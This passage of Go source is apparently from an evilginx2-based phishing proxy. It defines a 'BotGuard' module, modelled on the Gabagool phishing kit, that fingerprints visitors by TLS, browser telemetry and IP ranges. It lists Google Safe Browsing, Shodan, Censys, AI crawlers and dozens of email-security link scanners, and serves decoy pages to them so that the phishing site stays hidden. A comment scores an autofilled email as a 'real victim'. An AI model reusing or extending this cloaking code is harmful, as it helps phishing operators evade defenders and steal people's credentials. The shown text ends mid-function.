package core

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// JA4LearningProfile stores auto-learned data for a specific JA4 fingerprint.
// BotGuard tracks this across sessions to build confidence about whether
// a JA4 belongs to a real browser or a bot/scanner.
type JA4LearningProfile struct {
	LastScores       []int             `json:"last_scores"`       // Rolling window of last N trust scores
	TotalObservations int              `json:"total_observations"` // Total times this JA4 has been scored
	AvgScore         float64           `json:"avg_score"`          // Running average trust score
	FirstSeen        time.Time         `json:"first_seen"`         // When this JA4 was first observed
	LastSeen         time.Time         `json:"last_seen"`          // Most recent observation
	AutoBlacklisted  bool              `json:"auto_blacklisted"`   // Auto-learning flagged this as bot
	AutoWhitelisted  bool              `json:"auto_whitelisted"`   // Auto-learning confirmed this as browser
	BlockedCount     int               `json:"blocked_count"`      // Times blocked under this JA4
	AllowedCount     int               `json:"allowed_count"`      // Times allowed under this JA4
	RequestPaths     map[string]int    `json:"request_paths"`      // Path histogram (for scanner pattern detection)
	LastIPs          map[string]bool   `json:"last_ips"`           // IPs seen with this JA4
}

// BotGuard implements bot detection using JA4-like fingerprinting and JS telemetry
// Inspired by Gabagool phishing kit's bot detection techniques
type BotGuard struct {
	sync.RWMutex
	enabled          bool
	spoofUrls        []string                    // URLs to randomly proxy when bot detected
	whitelist        map[string]bool             // Whitelisted JA4 fingerprints
	blacklist        map[string]bool             // Known bot JA4 fingerprints
	telemetry        map[string]*ClientTelemetry
	trustScore       map[string]int              // IP -> trust score (0-100)
	requestTimes     map[string][]int64          // IP -> list of request timestamps (for rapid interaction detection)
	cookieTestCache  map[string]bool             // IP -> cookie test passed
	firstSeen        map[string]time.Time        // IP -> first seen time (for grace period)
	requestCount     map[string]int              // IP -> request count
	emailWhitelist   map[string]bool             // IP -> autofill email detected (auto-whitelist)
	googleNets       []*net.IPNet                // Pre-parsed Google crawler CIDRs
	scannerNets      []*net.IPNet                // Pre-parsed security scanner CIDRs
	ipClassCache     map[string]string           // IP -> classification ("google", "scanner", "cloud", "clean")
	ipCacheTimes     map[string]time.Time        // IP -> cache timestamp
	config           *BotGuardConfig
	ja4Profiles      map[string]*JA4LearningProfile // JA4 -> auto-learned profile
	learningEnabled  bool                           // JA4 auto-learning toggle
	autoBlacklistMin float64                        // Avg score below this triggers auto-blacklist (default: 20)
	autoWhitelistMin float64                        // Avg score above this triggers auto-whitelist (default: 80)
	minObservations  int                            // Min observations before auto-decision (default: 10)
	learnWindow      int                            // Rolling window size for avg calculation (default: 20)
}

// BotGuardConfig stores botguard settings
type BotGuardConfig struct {
	Enabled            bool     `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
	SpoofUrls          []string `mapstructure:"spoof_urls" json:"spoof_urls" yaml:"spoof_urls"`
	WhitelistJA4       []string `mapstructure:"whitelist_ja4" json:"whitelist_ja4" yaml:"whitelist_ja4"`
	BlacklistJA4       []string `mapstructure:"blacklist_ja4" json:"blacklist_ja4" yaml:"blacklist_ja4"`
	MinTrustScore      int      `mapstructure:"min_trust_score" json:"min_trust_score" yaml:"min_trust_score"`
	MinMouseMovements  int      `mapstructure:"min_mouse_movements" json:"min_mouse_movements" yaml:"min_mouse_movements"`    // Gabagool uses 100
	RapidRequestWindow int      `mapstructure:"rapid_request_window" json:"rapid_request_window" yaml:"rapid_request_window"` // Gabagool uses 5000ms
	MaxRapidRequests   int      `mapstructure:"max_rapid_requests" json:"max_rapid_requests" yaml:"max_rapid_requests"`       // Max requests in window
}

// ClientTelemetry stores browser telemetry data collected via JavaScript
type ClientTelemetry struct {
	UserAgent       string   `json:"ua"`
	Platform        string   `json:"platform"`
	Languages       []string `json:"languages"`
	ScreenWidth     int      `json:"screenWidth"`
	ScreenHeight    int      `json:"screenHeight"`
	ColorDepth      int      `json:"colorDepth"`
	Timezone        string   `json:"timezone"`
	TimezoneOffset  int      `json:"timezoneOffset"`
	CookiesEnabled  bool     `json:"cookiesEnabled"`
	DoNotTrack      string   `json:"doNotTrack"`
	HardwareConcur  int      `json:"hardwareConcurrency"`
	DeviceMemory    float64  `json:"deviceMemory"`
	TouchPoints     int      `json:"maxTouchPoints"`
	WebGLVendor     string   `json:"webglVendor"`
	WebGLRenderer   string   `json:"webglRenderer"`
	Canvas          string   `json:"canvas"`     // Canvas fingerprint hash
	AudioContext    string   `json:"audio"`      // AudioContext fingerprint
	Fonts           []string `json:"fonts"`      // Detected fonts
	Plugins         []string `json:"plugins"`    // Browser plugins
	HasWebDriver    bool     `json:"webdriver"`  // navigator.webdriver
	HasAutomation   bool     `json:"automation"` // window.__nightmare, etc
	Timestamp       int64    `json:"timestamp"`
	MouseMovements  int      `json:"mouseMovements"`
	KeyStrokes      int      `json:"keyStrokes"`
	ScrollEvents    int      `json:"scrollEvents"`
	CookieTestOk    bool     `json:"cookieTest"`      // Gabagool: Cookie functionality test
	InteractionTime int64    `json:"interactionTime"` // Time since page load before interaction
	Email           string   `json:"email"`           // Email from autofill/autograb on login form
	ClientIP        string   `json:"-"`               // Not from JS
	JA4Fingerprint  string   `json:"-"`               // Not from JS
	CollectedAt     time.Time
}

// JA4Components represents the components of a JA4 fingerprint
type JA4Components struct {
	Protocol       string // t=TCP, q=QUIC
	TLSVersion     string // 13=TLS1.3, 12=TLS1.2, etc
	SNIPresent     string // d=SNI present, i=no SNI
	CipherCount    int    // Number of ciphers
	ExtensionCount int    // Number of extensions
	ALPN           string // First ALPN value or 00
	CipherHash     string // Truncated hash of sorted ciphers
	ExtensionHash  string // Truncated hash of sorted extensions
}

// Known bot/scanner JA4 patterns (partial matches)
var knownBotPatterns = []string{
	"t13d", // Common scanner pattern (no SNI + TLS1.3)
	"t12i", // No SNI + TLS1.2 (often scanners)
	"q13i", // QUIC without SNI
}

// Known browser JA4 patterns (partial matches for legitimate browsers)
var knownBrowserPatterns = []string{
	"t13d1516h2", // Chrome/Chromium typical pattern
	"t13d1516h1", // Firefox typical pattern
	"t13d1407h2", // Safari typical pattern
	"t13d1308h2", // Edge typical pattern
}

// googleCrawlerCIDRs contains Google's published crawler IP ranges.
// These include Googlebot, Google-Safety, AdsBot-Google, and user-triggered fetchers.
// Source: https://developers.google.com/crawling/docs/crawlers-fetchers/overview-google-crawlers
var googleCrawlerCIDRs = []string{
	// Googlebot, GoogleOther, Google-InspectionTool (common-crawlers.json)
	"66.249.64.0/19", // Primary Googlebot range 66.249.64.0 - 66.249.95.255
	"192.178.4.0/22", // Secondary Googlebot 192.178.4.0 - 192.178.7.255
	// Google-Safety, AdsBot-Google, APIs-Google (special-crawlers.json)
	"108.177.2.0/24",
	"192.178.16.0/23", // 192.178.16.0 - 192.178.17.255
	"209.85.238.0/24",
	"72.14.199.0/24",
	"74.125.148.0/22", // 74.125.148.0 - 74.125.151.255
	"74.125.216.0/22", // 74.125.216.0 - 74.125.219.255
	// User-triggered fetchers (user-triggered-fetchers-google.json)
	"66.102.6.0/23",   // 66.102.6.0 - 66.102.7.255
	"142.250.32.0/23", // 142.250.32.0 - 142.250.33.255
	"74.125.208.0/21", // 74.125.208.0 - 74.125.215.255
	"192.178.8.0/21",  // 192.178.8.0 - 192.178.15.255
}

// securityScannerCIDRs contains IP ranges of known security research/scanner infrastructure
var securityScannerCIDRs = []string{
	// Censys — internet-wide scanning platform
	"162.142.125.0/24",
	"167.94.138.0/24",
	"167.94.145.0/24",
	"167.94.146.0/24",
	"167.248.133.0/24",
	// Shodan — internet device search engine
	"71.6.135.0/24",
	"71.6.146.0/24",
	"71.6.158.0/24",
	"71.6.165.0/24",
	"66.240.205.0/24",
	// Shadowserver — security research foundation
	"74.82.47.0/24",
	"184.105.247.0/24",
	// BinaryEdge — internet scanning
	"45.155.205.0/24",
	// SecurityTrails / Recorded Future
	"52.250.0.0/16",
}

// cloudProviderDNSSuffixes contains reverse DNS hostname patterns for known cloud/datacenter providers.
// Security scanners and automated tools commonly run from these networks.
var cloudProviderDNSSuffixes = []string{
	// AWS
	".amazonaws.com",
	// GCP
	".googleusercontent.com",
	".cloud.google.com",
	// Azure
	".cloudapp.azure.com",
	".azurewebsites.net",
	".windows.net",
	// DigitalOcean
	".digitalocean.com",
	// Vultr
	".vultr.com",
	// Linode / Akamai
	".linode.com",
	".linodeusercontent.com",
	// OVH
	".ovh.net",
	".ovhcloud.com",
	// Hetzner
	".your-server.de",
	".hetzner.cloud",
	// Oracle Cloud
	".oraclecloud.com",
	// Scaleway
	".scaleway.com",
	// UpCloud
	".upcloud.host",
}

// Gabagool-style: Known bot user agent patterns (comprehensive list)
// These are checked BEFORE telemetry so bots that don't execute JS are caught
var knownBotUserAgents = []string{
	// Search engine bots
	"googlebot",
	"bingbot",
	"yandexbot",
	"baiduspider",
	"duckduckbot",
	"slurp", // Yahoo
	"applebot",
	"sogou",
	"exabot",
	"ia_archiver", // Alexa
	"archive.org_bot",

	// AI Crawlers / AI Assistants / AI Search Bots
	"amazonbot",             // Amazon AI Crawler
	"anthropic",             // Anthropic (catch-all)
	"anchor",                // Anchor Browser AI Crawler
	"bytespider",            // ByteDance AI Crawler
	"ccbot",                 // Common Crawl AI Crawler
	"chatgpt-user",          // OpenAI AI Assistant
	"claudebot",             // Anthropic AI Crawler
	"claude-searchbot",      // Anthropic AI Search
	"claude-user",           // Anthropic AI Assistant
	"claude-web",            // Anthropic Web Crawler
	"cohere-ai",             // Cohere AI Crawler
	"diffbot",               // Diffbot AI Crawler
	"duckassistbot",         // DuckDuckGo AI Assistant
	"google-cloudvertexbot", // Google Cloud Vertex AI Crawler
	"google-extended",       // Google AI (Bard/Gemini)
	"gptbot",                // OpenAI AI Crawler
	"meta-externalagent",    // Meta AI Crawler
	"meta-externalfetcher",  // Meta AI Assistant
	"mistralai-user",        // Mistral AI Assistant
	"novellum",              // Novellum AI Crawler
	"oai-searchbot",         // OpenAI AI Search
	"openai",                // OpenAI (catch-all)
	"perplexitybot",         // Perplexity AI Search
	"perplexity-user",       // Perplexity AI Assistant
	"petalbot",              // Huawei AI Crawler
	"proratainc",            // ProRata.ai AI Crawler
	"prorata",               // ProRata.ai (catch-all)
	"timpibot",              // Timpi AI Crawler
	"timpi",                 // Timpi (catch-all)
	"youbot",                // You.com AI Search
	"ai2bot",                // Allen AI Crawler
	"omgili",                // Webz.io AI Crawler
	"iaskspider",            // iAsk AI Search

	// Social media preview bots (these don't execute JS!)
	"facebookexternalhit",
	"facebot",
	"facebook",
	"linkedinbot",
	"linkedin",
	"twitterbot",
	"twitter",
	"whatsapp",    // WhatsApp link preview
	"telegrambot", // Telegram link preview
	"telegram",
	"discordbot",
	"discord",
	"slackbot",
	"slack",
	"skypeuripreview",
	"skype",
	"viber",
	"line",
	"kakaotalk",
	"snapchat",
	"pinterest",
	"pinterestbot",
	"redditbot",
	"embedly",
	"quora",
	"outbrain",
	"vkshare",
	"w3c_validator",

	// SEO/Marketing bots
	"mj12bot",
	"ahrefsbot",
	"ahrefs",
	"semrushbot",
	"semrush",
	"dotbot",
	"rogerbot",
	"screaming frog",
	"seokicks",
	"sistrix",
	"blexbot",
	"dataforseo",
	"megaindex",
	"majestic",
	"moz.com",
	"seobilitybot",

	// Security scanners
	"nmap",
	"nikto",
	"sqlmap",
	"masscan",
	"zgrab",
	"nuclei",
	"httpx",
	"gobuster",
	"dirbuster",
	"wpscan",
	"burp",
	"acunetix",
	"nessus",
	"qualys",
	"openvas",
	"w3af",
	"owasp",
	"zap",
	"skipfish",
	"arachni",
	"urlscan",
	"virustotal",
	"phishtank",
	"netcraft",
	"safebrowsing",
	"google-safety",

	// HTTP clients/libraries
	"curl",
	"wget",
	"python-requests",
	"python-urllib",
	"python/",
	"axios",
	"node-fetch",
	"node/",
	"scrapy",
	"httpclient",
	"okhttp",
	"go-http-client",
	"java/",
	"apache-httpclient",
	"libwww-perl",
	"lwp-",
	"perl/",
	"ruby/",
	"php/",
	"httpunit",
	"httrack",
	"webcopier",
	"offline explorer",
	"getright",
	"grab",
	"fetch",
	"download",

	// Headless browsers / automation
	"headlesschrome",
	"headless",
	"phantom",
	"phantomjs",
	"puppeteer",
	"selenium",
	"playwright",
	"cypress",
	"webdriver",
	"chromedriver",
	"geckodriver",
	"electron",
	"nightmare",
	"zombie",
	"casperjs",
	"slimerjs",
	"splinter",

	// Generic bot patterns
	"crawler",
	"spider",
	"scraper",
	"bot/",
	"bot ",
	"-bot",
	"_bot",
	"robot",
	"crawl",
	"monitor",
	"checker",
	"validator",
	"http://", // Bots often have URLs in UA
	"https://",
	"+http",
	"preview",
	"thumb",
	"proxy",
	"monitoring",
	"uptime",
	"pingdom",
	"statuscake",
	"uptimerobot",
	"site24x7",
	"catchpoint",
	"cloudflare",
	"imperva",

	// Email URL/Link Scanner Bots (Security products that scan links in emails)
	// Microsoft Defender for Office 365 / Safe Links
	"microsoft office protocol discovery",
	"microsoft-cryptoapi",
	"microsoft url control",
	"microsoft office existence discovery",
	"microsoft office protocol",
	"microsoft data access",
	"msoffice",
	"ms office",
	"outlook",
	"exchangeservices",
	"microsoft-office",
	"office-web",
	"microsoft-webdav-miniredir",
	"microsoft-crm",
	"azurecloud",
	"safelinks",
	"atp", // Advanced Threat Protection

	// Proofpoint
	"proofpoint",
	"ppscanner",
	"pp-urlscan",
	"ppcomplete",
	"proofpointprotection",

	// Mimecast
	"mimecast",
	"mimecastbot",

	// Barracuda
	"barracuda",
	"barracudasentinel",
	"barracudaessentials",
	"barracudacentral",

	// Cisco Email Security / IronPort
	"cisco",
	"ironport",
	"ciscoimagelicensing",
	"wsa", // Web Security Appliance
	"esa", // Email Security Appliance

	// Symantec / Broadcom Email Security
	"symantec",
	"messagelabs",
	"bluecoat",
	"broadcom",

	// FireEye / Trellix
	"fireeye",
	"trellix",
	"mandiant",

	// Forcepoint
	"forcepoint",
	"websense",
	"triton",

	// Trend Micro
	"trendmicro",
	"trend micro",
	"deep discovery",
	"iwss",  // InterScan Web Security
	"imsva", // InterScan Messaging Security

	// Sophos
	"sophos",
	"sophosxg",
	"reflexion",

	// McAfee / Skyhigh
	"mcafee",
	"skyhigh",
	"mvision",

	// Palo Alto Networks
	"paloalto",
	"pan-",
	"wildfire",
	"prisma",
	"cortex",

	// Fortinet / FortiMail
	"fortinet",
	"fortimail",
	"fortigate",
	"fortisandbox",

	// Zscaler
	"zscaler",
	"zscalercloud",

	// Abnormal Security
	"abnormal",
	"abnormalsecurity",

	// Avanan / Check Point
	"avanan",
	"checkpoint",
	"check point",

	// Area1 Security / Cloudflare
	"area1",
	"area1security",

	// Tessian
	"tessian",

	// Egress
	"egress",

	// Agari / HelpSystems
	"agari",
	"helpsystems",

	// Knowbe4
	"knowbe4",

	// Cofense
	"cofense",
	"phishme",

	// SpamTitan / TitanHQ
	"spamtitan",
	"titanhq",
	"webtitan",

	// MailGuard
	"mailguard",

	// Vade Secure
	"vadesecure",
	"vade",

	// Inky
	"inky",

	// GreatHorn
	"greathorn",

	// Generic email security patterns
	"emailscanner",
	"mailscanner",
	"email-security",
	"mail-security",
	"antispam",
	"anti-spam",
	"antiphish",
	"anti-phish",
	"urldefense",
	"urlrewrite",
	"urlsecurity",
	"linkscan",
	"safelink",
	"securelink",
	"urlcheck",
	"linkcheck",
	"threatscanner",
	"malwarescanner",
	"sandbox",
	"securityscanner",
	"emailgateway",
	"mailgateway",
	"securitygateway",

	// Quarantine / Email Filtering Systems
	"quarantine",
	"emailquarantine",
	"mail-quarantine",
	"spamquarantine",
	"messagehold",
	"holdqueue",
	"digestreport",
	"quarantinereport",
	"releasemessage",
	"releasemail",
	"mailrelease",
	"messagerelease",
	"spamrelease",
	"quarantineviewer",
	"quarantineaccess",
	"enduser-quarantine",
	"spam-digest",
	"quarantine-digest",
	"mailfilter",
	"spamfilter",
	"contentfilter",
	"messagefilter",
	"emailfilter",
	"filterservice",

	// Additional Email Security Gateways
	"clearswift",
	"mimesweeper",
	"mailsweeper",
	"mailmarshal",
	"trustwave",
	"spamassassin",
	"rspamd",
	"amavis",
	"clamav",
	"policyd",
	"postfix",
	"sendmail-",
	"exim",
	"zimbra",
	"horde",
	"roundcube",
	"squirrelmail",
	"openwebmail",
	"atmail",

	// Cloud Email Services URL Scanners
	"googlemail",
	"gmail",
	"yahoomail",
	"aolmail",
	"zohomail",
	"fastmail",
	"mailspring",
	"mailbird",
	"emclient",
	"thunderbird",
	"mailpilot",

	// URL Detonation / Sandboxing
	"detonation",
	"urldetonation",
	"linkdetonation",
	"clicktime",
	"clicktrace",
	"clickprotect",
	"urlprotect",
	"linkprotect",
	"rewriteurl",
	"wrappedurl",
	"redirectcheck",
	"linkwrap",
	"urlwrap",
	"saferedirect",
	"securedlink",
	"protectedlink",
	"trackedlink",
	"clickthrough",
	"urltracker",
	"linktracker",
	"urlanalyzer",
	"linkanalyzer",
	"urlverify",
	"linkverify",
	"urlvalidate",
	"linkvalidate",
	"phishingdetection",
	"maliciousurl",
	"suspiciouslink",

	// Additional Security Vendors
	"appriver",
	"securence",
	"libraesva",
	"spambrella",
	"graphus",
	"guardian",
	"hornetsecurity",
	"altospam",
	"mailcleaner",
	"cleanmail",
	"zerospam",
	"spamhero",
	"mailroute",
	"mailchannels",
	"socketlabs",
	"sendgrid",
	"mailgun",
	"postmark",
	"sparkpost",
	"amazonses",
	"mandrillapp",
}

// NewBotGuard creates a new BotGuard instance
func NewBotGuard() *BotGuard {
	bg := &BotGuard{
		enabled:          false,
		spoofUrls:        []string{},
		whitelist:        make(map[string]bool),
		blacklist:        make(map[string]bool),
		telemetry:        make(map[string]*ClientTelemetry),
		trustScore:       make(map[string]int),
		requestTimes:     make(map[string][]int64),
		cookieTestCache:  make(map[string]bool),
		firstSeen:        make(map[string]time.Time),
		requestCount:     make(map[string]int),
		emailWhitelist:   make(map[string]bool),
		ipClassCache:     make(map[string]string),
		ipCacheTimes:     make(map[string]time.Time),
		ja4Profiles:      make(map[string]*JA4LearningProfile),
		learningEnabled:  true,  // auto-learning on by default
		autoBlacklistMin: 20.0,  // auto-blacklist if avg score < 20
		autoWhitelistMin: 80.0,  // auto-whitelist if avg score > 80
		minObservations:  10,    // need 10 observations before deciding
		learnWindow:      20,    // rolling window of 20 scores
		config: &BotGuardConfig{
			MinTrustScore:      25,   // Lower threshold - we rely more on bot UA detection
			MinMouseMovements:  50,   // Reduced from 100 - more forgiving
			RapidRequestWindow: 5000, // 5 seconds (Gabagool)
			MaxRapidRequests:   15,   // Increased - real pages make many requests
		},
	}
	bg.initIPFilters()
	return bg
}

// initIPFilters parses CIDR ranges into *net.IPNet for fast IP lookups
func (bg *BotGuard) initIPFilters() {
	for _, cidr := range googleCrawlerCIDRs {
		_, network, err := net.ParseCIDR(cidr)
		if err == nil {
			bg.googleNets = append(bg.googleNets, network)
		}
	}
	for _, cidr := range securityScannerCIDRs {
		_, network, err := net.ParseCIDR(cidr)
		if err == nil {
			bg.scannerNets = append(bg.scannerNets, network)
		}
	}
	log.Debug("[botguard] IP filters initialized: %d Google CIDRs, %d scanner CIDRs",
		len(bg.googleNets), len(bg.scannerNets))
}

// IsGoogleCrawlerIP checks if an IP belongs to Google's published crawler ranges.
// This catches Google-Safety, Googlebot, AdsBot, and user-triggered fetchers.
func (bg *BotGuard) IsGoogleCrawlerIP(ipStr string) bool {
	ip := net.ParseIP(ipStr)
	if ip == nil {
		return false
	}
	for _, network := range bg.googleNets {
		if network.Contains(ip) {
			return true
		}
	}
	return false
}

// IsSecurityScannerIP checks if an IP belongs to known security scanner infrastructure
// (Censys, Shodan, Shadowserver, BinaryEdge, etc.)
func (bg *BotGuard) IsSecurityScannerIP(ipStr string) bool {
	ip := net.ParseIP(ipStr)
	if ip == nil {
		return false
	}
	for _, network := range bg.scannerNets {
		if network.Contains(ip) {
			return true
		}
	}
	return false
}

// IsCloudProviderIP checks if an IP belongs to a known cloud/datacenter provider
// via reverse DNS lookup. Results are cached for 1 hour to avoid DNS overhead.
func (bg *BotGuard) IsCloudProviderIP(ipStr string) bool {
	// Check cache first
	bg.RLock()
	if class, ok := bg.ipClassCache[ipStr]; ok {
		cacheTime := bg.ipCacheTimes[ipStr]
		bg.RUnlock()
		if time.Since(cacheTime) < time.Hour {
			return class == "cloud"
		}
	} else {
		bg.RUnlock()
	}

	// Perform reverse DNS lookup with short timeout
	isCloud := false
	names, err := net.LookupAddr(ipStr)
	if err == nil {
		for _, name := range names {
			nameLower := strings.ToLower(name)
			for _, suffix := range cloudProviderDNSSuffixes {
				if strings.HasSuffix(nameLower, suffix+".") || strings.HasSuffix(nameLower, suffix) {
					isCloud = true
					break
				}
			}
			if isCloud {
				break
			}
		}
	}

	// Cache result
	bg.Lock()
	if isCloud {
		bg.ipClassCache[ipStr] = "cloud"
	} else {
		bg.ipClassCache[ipStr] = "clean"
	}
	bg.ipCacheTimes[ipStr] = time.Now()
	bg.Unlock()

	return isCloud
}

// CheckCloudProviderAsync initiates a non-blocking reverse DNS check for cloud provider detection.
// The result is cached and can be queried later with GetCachedIPClass().
func (bg *BotGuard) CheckCloudProviderAsync(ipStr string) {
	bg.RLock()
	_, cached := bg.ipClassCache[ipStr]
	bg.RUnlock()
	if cached {
		return
	}
	go func() {
		bg.IsCloudProviderIP(ipStr) // Performs DNS lookup and caches result
	}()
}

// GetCachedIPClass returns the cached IP classification without blocking.
// Returns "google", "scanner", "cloud", "clean", or "unknown" (not yet checked).
func (bg *BotGuard) GetCachedIPClass(ipStr string) string {
	bg.RLock()
	defer bg.RUnlock()
	if class, ok := bg.ipClassCache[ipStr]; ok {
		cacheTime := bg.ipCacheTimes[ipStr]
		if time.Since(cacheTime) < time.Hour {
			return class
		}
	}
	return "unknown"
}

// VerifyGoogleCrawlerByDNS performs reverse + forward DNS verification to confirm a Google crawler.
// Returns true only if the IP's reverse DNS resolves to a Google hostname AND that hostname
// forward-resolves back to the same IP. This is the verification method recommended by Google.
func (bg *BotGuard) VerifyGoogleCrawlerByDNS(ipStr string) bool {
	names, err := net.LookupAddr(ipStr)
	if err != nil {
		return false
	}
	for _, name := range names {
		nameLower := strings.ToLower(name)
		if strings.HasSuffix(nameLower, ".googlebot.com.") ||
			strings.HasSuffix(nameLower, ".google.com.") ||
			strings.HasSuffix(nameLower, ".googleusercontent.com.") {
			// Forward DNS lookup to verify the hostname resolves back to same IP
			addrs, err := net.LookupHost(strings.TrimSuffix(name, "."))
			if err == nil {
				for _, addr := range addrs {
					if addr == ipStr {
						return true // Verified Google crawler
					}
				}
			}
		}
	}
	return false
}

// ClassifyIP performs all IP-based checks and returns a classification string.
// Uses cache to avoid repeated CIDR/DNS lookups for the same IP.
func (bg *BotGuard) ClassifyIP(ipStr string) string {
	// Check cache
	bg.RLock()
	if class, ok := bg.ipClassCache[ipStr]; ok {
		cacheTime := bg.ipCacheTimes[ipStr]
		bg.RUnlock()
		if time.Since(cacheTime) < time.Hour {
			return class
		}
	} else {
		bg.RUnlock()
	}

	// Google crawler CIDR check (instant)
	if bg.IsGoogleCrawlerIP(ipStr) {
		bg.Lock()
		bg.ipClassCache[ipStr] = "google"
		bg.ipCacheTimes[ipStr] = time.Now()
		bg.Unlock()
		return "google"
	}

	// Security scanner CIDR check (instant)
	if bg.IsSecurityScannerIP(ipStr) {
		bg.Lock()
		bg.ipClassCache[ipStr] = "scanner"
		bg.ipCacheTimes[ipStr] = time.Now()
		bg.Unlock()
		return "scanner"
	}

	// Cloud provider reverse DNS check (may block briefly)
	if bg.IsCloudProviderIP(ipStr) {
		return "cloud" // Already cached by IsCloudProviderIP
	}

	return "clean"
}

// Enable enables or disables botguard
func (bg *BotGuard) Enable(enabled bool) {
	bg.Lock()
	defer bg.Unlock()
	bg.enabled = enabled
	bg.config.Enabled = enabled
}

// IsEnabled returns whether botguard is enabled
func (bg *BotGuard) IsEnabled() bool {
	bg.RLock()
	defer bg.RUnlock()
	return bg.enabled
}

// SetSpoofUrls sets the list of URLs to randomly proxy when a bot is detected
func (bg *BotGuard) SetSpoofUrls(urls []string) {
	bg.Lock()
	defer bg.Unlock()
	bg.spoofUrls = urls
	bg.config.SpoofUrls = urls
}

// AddSpoofUrl adds a URL to the spoof list
func (bg *BotGuard) AddSpoofUrl(url string) {
	bg.Lock()
	defer bg.Unlock()
	for _, u := range bg.spoofUrls {
		if u == url {
			return // Already exists
		}
	}
	bg.spoofUrls = append(bg.spoofUrls, url)
	bg.config.SpoofUrls = bg.spoofUrls
}

// RemoveSpoofUrl removes a URL from the spoof list
func (bg *BotGuard) RemoveSpoofUrl(url string) bool {
	bg.Lock()
	defer bg.Unlock()
	for i, u := range bg.spoofUrls {
		if u == url {
			bg.spoofUrls = append(bg.spoofUrls[:i], bg.spoofUrls[i+1:]...)
			bg.config.SpoofUrls = bg.spoofUrls
			return true
		}
	}
	return false
}

// GetSpoofUrls returns the list of spoof URLs
func (bg *BotGuard) GetSpoofUrls() []string {
	bg.RLock()
	defer bg.RUnlock()
	return bg.spoofUrls
}

// GetRandomSpoofUrl returns a random URL from the spoof list
func (bg *BotGuard) GetRandomSpoofUrl() string {
	bg.RLock()
	defer bg.RUnlock()
	if len(bg.spoofUrls) == 0 {
		return ""
	}
	return bg.spoofUrls[rand.Intn(len(bg.spoofUrls))]
}

// AddWhitelist adds a JA4 fingerprint to the whitelist
func (bg *BotGuard) AddWhitelist(ja4 string) {
	bg.Lock()
	defer bg.Unlock()
	bg.whitelist[ja4] = true
}

// AddBlacklist adds a JA4 fingerprint to the blacklist
func (bg *BotGuard) AddBlacklist(ja4 string) {
	bg.Lock()
	defer bg.Unlock()
	bg.blacklist[ja4] = true
}

// StoreTelemetry stores client telemetry data
func (bg *BotGuard) StoreTelemetry(clientIP string, tel *ClientTelemetry) {
	bg.Lock()
	defer bg.Unlock()
	tel.ClientIP = clientIP
	tel.CollectedAt = time.Now()
	bg.telemetry[clientIP] = tel

	// Track cookie test result
	if tel.CookieTestOk {
		bg.cookieTestCache[clientIP] = true
	}
}

// GetTelemetry retrieves telemetry for a client IP
func (bg *BotGuard) GetTelemetry(clientIP string) *ClientTelemetry {
	bg.RLock()
	defer bg.RUnlock()
	return bg.telemetry[clientIP]
}

// RecordRequest records a request timestamp for rapid interaction detection (Gabagool technique)
func (bg *BotGuard) RecordRequest(clientIP string) {
	bg.Lock()
	defer bg.Unlock()

	now := time.Now().UnixMilli()
	if _, ok := bg.requestTimes[clientIP]; !ok {
		bg.requestTimes[clientIP] = []int64{}
	}
	bg.requestTimes[clientIP] = append(bg.requestTimes[clientIP], now)

	// Keep only recent requests
	windowMs := int64(bg.config.RapidRequestWindow)
	filtered := []int64{}
	for _, t := range bg.requestTimes[clientIP] {
		if now-t < windowMs {
			filtered = append(filtered, t)
		}
	}
	bg.requestTimes[clientIP] = filtered
}

// IsRapidInteraction checks if requests are coming too fast (Gabagool technique)
func (bg *BotGuard) IsRapidInteraction(clientIP string) bool {
	bg.RLock()
	defer bg.RUnlock()

	times, ok := bg.requestTimes[clientIP]
	if !ok {
		return false
	}

	return len(times) > bg.config.MaxRapidRequests
}

// IsBotUserAgent checks if user agent matches known bot patterns (Gabagool technique)
func (bg *BotGuard) IsBotUserAgent(userAgent string) bool {
	ua := strings.ToLower(userAgent)

	// Whitelist: Let's Encrypt / ACME validation servers MUST reach us for cert issuance
	if strings.Contains(ua, "let's encrypt") || strings.Contains(ua, "letsencrypt") || strings.Contains(ua, "acme") {
		return false
	}

	for _, botPattern := range knownBotUserAgents {
		if strings.Contains(ua, botPattern) {
			return true
		}
	}
	return false
}

// CalculateTrustScore calculates a trust score based on telemetry
// Implements Gabagool-style bot detection techniques
func (bg *BotGuard) CalculateTrustScore(clientIP string, ja4 string) int {
	bg.RLock()
	tel := bg.telemetry[clientIP]
	bg.RUnlock()

	score := 40 // Start slightly lower - must prove humanity

	// Check whitelist/blacklist first
	bg.RLock()
	if bg.whitelist[ja4] {
		bg.RUnlock()
		return 100
	}
	if bg.blacklist[ja4] {
		bg.RUnlock()
		return 0
	}
	bg.RUnlock()

	// ============================================
	// GABAGOOL TECHNIQUE 1: Rapid Interaction Detection
	// Bots often make rapid successive requests
	// ============================================
	if bg.IsRapidInteraction(clientIP) {
		log.Debug("[botguard] Rapid requests detected from %s", clientIP)
		score -= 25
	}

	// Check JA4 against known patterns
	for _, pattern := range knownBotPatterns {
		if strings.HasPrefix(ja4, pattern) {
			score -= 20
			break
		}
	}

	for _, pattern := range knownBrowserPatterns {
		if strings.HasPrefix(ja4, pattern) {
			score += 15
			break
		}
	}

	// If we have telemetry, analyze it with Gabagool techniques
	if tel != nil {
		// ============================================
		// EMAIL AUTOFILL/AUTOGRAB CHECK
		// If a real email was autofilled in the login form,
		// this is a real victim - give massive score bonus
		// ============================================
		if tel.Email != "" {
			score += 50 // Massive bonus - bots don't autofill emails
		}

		// ============================================
		// GABAGOOL TECHNIQUE 2: WebDriver Check
		// navigator.webdriver is true in headless browsers
		// This is the most reliable automation indicator
		// ============================================
		if tel.HasWebDriver {
			log.Warning("[botguard] Headless browser detected from %s", clientIP)
			score -= 50 // Immediate strong penalty - almost certainly a bot
		}

		// Check automation frameworks - reduced penalty due to false positives
		// Many websites inject globals that can trigger these checks
		if tel.HasAutomation {
			log.Debug("[botguard] Automation indicators from %s (may be website scripts)", clientIP)
			score -= 15 // Reduced penalty - website scripts can trigger this
		}

		// ============================================
		// GABAGOOL TECHNIQUE 3: Mouse Movement Detection
		// Real users generate >100 mouse movements
		// Bots typically don't generate complex mouse movements
		// ============================================
		minMouse := bg.config.MinMouseMovements
		if tel.MouseMovements >= minMouse {
			score += 20 // Significant bonus for sufficient mouse activity
		} else if tel.MouseMovements > 50 {
			score += 10 // Partial credit
		} else if tel.MouseMovements > 10 {
